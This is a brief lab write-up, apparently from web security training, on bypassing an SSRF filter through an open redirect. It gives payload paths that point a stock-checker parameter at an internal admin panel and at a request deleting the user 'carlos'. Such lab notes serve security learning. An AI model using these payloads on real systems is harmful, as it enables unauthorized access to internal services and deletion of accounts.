# Lab: SSRF with filter bypass via open redirection vulnerability

need to change the stockAPI in the stock checker to:
```
/product/nextProduct?path=http://192.168.0.12:8080/admin
```
In order for the server to retrieve the admin panel, then we want to send the delete request with the stock checker
```
/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```
